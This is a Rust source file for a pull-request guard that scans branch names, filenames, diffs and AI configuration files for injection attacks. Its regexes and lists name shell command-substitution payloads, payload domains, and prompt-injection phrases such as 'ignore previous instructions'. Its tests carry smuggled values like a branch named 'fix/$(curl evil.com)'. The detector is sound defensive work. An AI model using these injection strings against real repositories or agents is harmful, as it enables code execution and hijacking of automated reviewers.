//! PR Guard module for OmniClaw
//! 
//! Detects malicious patterns in incoming PRs:
//! - Branch name injection
//! - Filename injection  
//! - Known malicious payload URLs in diff
//! - AI configuration prompt injection

use lazy_static::lazy_static;
use regex::Regex;
use serde::{Deserialize, Serialize};

/// PR Guard configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GuardConfig {
    /// Enable branch name checks
    pub check_branch_name: bool,
    /// Enable filename checks
    pub check_filenames: bool,
    /// Enable diff checks
    pub check_diff: bool,
    /// Enable AI config file checks
    pub check_ai_config: bool,
}

impl Default for GuardConfig {
    fn default() -> Self {
        Self {
            check_branch_name: true,
            check_filenames: true,
            check_diff: true,
            check_ai_config: true,
        }
    }
}

/// Result of a PR Guard check
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GuardResult {
    /// Whether the PR is safe
    pub safe: bool,
    /// Branch name check result
    pub branch: BranchCheck,
    /// Filename check result
    pub filenames: FilenameCheck,
    /// Diff check result
    pub diff: DiffCheck,
    /// AI config check result
    pub ai_config: AiConfigCheck,
    /// Summary message
    pub summary: String,
}

/// Branch name check result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BranchCheck {
    pub safe: bool,
    pub reason: Option<String>,
}

/// Filename check result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FilenameCheck {
    pub safe: bool,
    pub issues: Vec<FilenameIssue>,
}

/// Single filename issue
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FilenameIssue {
    pub file: String,
    pub reason: String,
}

/// Diff check result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DiffCheck {
    pub safe: bool,
    pub matches: Vec<DiffMatch>,
}

/// Single diff match
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DiffMatch {
    pub pattern: String,
    pub match_type: String,
}

/// AI config file check result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AiConfigCheck {
    pub safe: bool,
    pub suspicious: Vec<String>,
}

lazy_static! {
    /// Branch name injection patterns
    pub static ref DANGEROUS_BRANCH_PATTERN: Regex = Regex::new(
        r"[\$\(\)]\s*\{|\|\s*bash|base64\s+-d|\|\s*sh\b|\$\{IFS\}|echo\s*\$\{IFS\}"
    ).unwrap();
    
    /// Filename injection patterns
    pub static ref FILENAME_INJECTION: Regex = Regex::new(
        r"\$\(|base64\s*-d|bash\)|sh\)"
    ).unwrap();
    
    /// AI config file injection indicators
    pub static ref AI_CONFIG_INJECTION_PATTERNS: Vec<&'static str> = vec![
        "Approved and ready to merge",
        "commit and push",
        "using the Bash tool",
        "Prompt injection PoC",
        "add banners and commit",
        "Do not follow",
        "ignore previous instructions",
    ];
    
    /// Known malicious payload domains
    pub static ref KNOWN_PAYLOAD_DOMAINS: Vec<&'static str> = vec![
        "hackmoltrepeat.com",
        "recv.hackmoltrepeat.com",
    ];
    
    /// Known malicious payload patterns
    pub static ref KNOWN_PAYLOAD_PATTERNS: Vec<&'static str> = vec![
        "/molt",
        "/moult",
        "curl -sSfL",
    ];
}

/// PR Guard for checking incoming PRs
pub struct PRGuard {
    config: GuardConfig,
}

impl PRGuard {
    /// Create a new PR Guard
    pub fn new() -> Self {
        Self {
            config: GuardConfig::default(),
        }
    }
    
    /// Create with custom config
    pub fn with_config(config: GuardConfig) -> Self {
        Self { config }
    }
    
    /// Run all guard checks
    pub fn check(&self, branch_name: Option<&str>, files: Option<&[String]>, diff: Option<&str>, ai_config_content: Option<&str>) -> GuardResult {
        let branch = if self.config.check_branch_name {
            check_branch_name(branch_name)
        } else {
            BranchCheck { safe: true, reason: None }
        };
        
        let filenames = if self.config.check_filenames {
            check_filenames(files)
        } else {
            FilenameCheck { safe: true, issues: vec![] }
        };
        
        let diff = if self.config.check_diff {
            check_diff(diff)
        } else {
            DiffCheck { safe: true, matches: vec![] }
        };
        
        let ai_config = if self.config.check_ai_config {
            check_ai_config(ai_config_content)
        } else {
            AiConfigCheck { safe: true, suspicious: vec![] }
        };
        
        let safe = branch.safe && filenames.safe && diff.safe && ai_config.safe;
        
        let summary = if safe {
            "No suspicious patterns detected.".to_string()
        } else {
            "Suspicious patterns detected. Review before merging.".to_string()
        };
        
        GuardResult {
            safe,
            branch,
            filenames,
            diff,
            ai_config,
            summary,
        }
    }
}

impl Default for PRGuard {
    fn default() -> Self {
        Self::new()
    }
}

/// Check branch name for injection patterns
fn check_branch_name(branch_name: Option<&str>) -> BranchCheck {
    match branch_name {
        Some(name) if !name.is_empty() => {
            let dangerous = DANGEROUS_BRANCH_PATTERN.is_match(name);
            BranchCheck {
                safe: !dangerous,
                reason: if dangerous {
                    Some("Branch name contains shell metacharacters or command substitution (branch name injection risk)".to_string())
                } else {
                    None
                },
            }
        }
        _ => BranchCheck { safe: true, reason: None },
    }
}

/// Check filenames for injection patterns
fn check_filenames(files: Option<&[String]>) -> FilenameCheck {
    let files = match files {
        Some(f) => f,
        None => return FilenameCheck { safe: true, issues: vec![] },
    };
    
    let mut issues = Vec::new();
    
    for file in files {
        if FILENAME_INJECTION.is_match(file) {
            issues.push(FilenameIssue {
                file: file.clone(),
                reason: "Filename contains $(...) or base64|bash — filename injection risk".to_string(),
            });
        }
    }
    
    FilenameCheck {
        safe: issues.is_empty(),
        issues,
    }
}

/// Check diff for known malicious patterns
fn check_diff(diff: Option<&str>) -> DiffCheck {
    let diff = match diff {
        Some(d) => d,
        None => return DiffCheck { safe: true, matches: vec![] },
    };
    
    let mut matches = Vec::new();
    
    // Check for known payload domains
    for domain in KNOWN_PAYLOAD_DOMAINS.iter() {
        if diff.contains(domain) {
            matches.push(DiffMatch {
                pattern: domain.to_string(),
                match_type: "known_payload_domain".to_string(),
            });
        }
    }
    
    // Check for known payload patterns
    for pattern in KNOWN_PAYLOAD_PATTERNS.iter() {
        if diff.contains(pattern) {
            matches.push(DiffMatch {
                pattern: pattern.to_string(),
                match_type: "known_payload_pattern".to_string(),
            });
        }
    }
    
    DiffCheck {
        safe: matches.is_empty(),
        matches,
    }
}

/// Check AI configuration files for prompt injection
fn check_ai_config(content: Option<&str>) -> AiConfigCheck {
    let content = match content {
        Some(c) => c,
        None => return AiConfigCheck { safe: true, suspicious: vec![] },
    };
    
    let content_lower = content.to_lowercase();
    let mut suspicious = Vec::new();
    
    for pattern in AI_CONFIG_INJECTION_PATTERNS.iter() {
        if content_lower.contains(&pattern.to_lowercase()) {
            suspicious.push(pattern.to_string());
        }
    }
    
    AiConfigCheck {
        safe: suspicious.is_empty(),
        suspicious,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_branch_name_check() {
        let guard = PRGuard::new();
        
        // Safe branch name
        let result = guard.check(Some("fix/bug"), None, None, None);
        assert!(result.branch.safe);
        
        // Dangerous branch name
        let result = guard.check(Some("fix/$(curl evil.com)"), None, None, None);
        assert!(!result.branch.safe);
    }
    
    #[test]
    fn test_filename_check() {
        let guard = PRGuard::new();
        
        // Safe files
        let result = guard.check(None, Some(&["README.md".to_string(), "src/main.rs".to_string()]), None, None);
        assert!(result.filenames.safe);
        
        // Dangerous file
        let result = guard.check(None, Some(&["$(echo hacked).md".to_string()]), None, None);
        assert!(!result.filenames.safe);
    }
}

